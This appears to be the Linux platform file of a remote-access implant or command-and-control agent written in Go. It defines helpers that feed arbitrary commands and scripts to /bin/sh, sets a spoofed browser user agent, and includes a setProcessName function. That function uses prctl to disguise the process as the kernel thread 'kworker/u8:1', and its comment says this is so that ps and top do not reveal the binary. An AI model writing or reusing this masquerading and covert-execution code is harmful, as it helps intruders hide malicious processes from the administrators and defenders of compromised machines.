//go:build linux

package core

import (
	"syscall"
	"unsafe"
)

const (
	platformName     = "linux"
	isWindows        = false
	supportsICMP     = true
	supportsTokens   = false
	supportsAssembly = false
	defaultUserAgent = "Mozilla/5.0 (X11; Linux x86_64)"
)

func shellCommand(command string) (string, []string, string) {
	return "/bin/sh", []string{"-s"}, command + "\n"
}

func shellScript(src string, args []string) (string, []string, string) {
	argv := []string{"-s"}
	argv = append(argv, args...)
	return "/bin/sh", argv, src
}

// setProcessName gives the main thread a plausible comm so
// `ps -o comm` (and top) does not show the build artifact name.
// PR_SET_NAME truncates at 15 bytes; this fits.
func setProcessName() {
	name := "kworker/u8:1"
	b, err := syscall.BytePtrFromString(name)
	if err != nil {
		return
	}
	_, _, _ = syscall.Syscall6(syscall.SYS_PRCTL, 15,
		uintptr(unsafe.Pointer(b)), 0, 0, 0, 0)
}
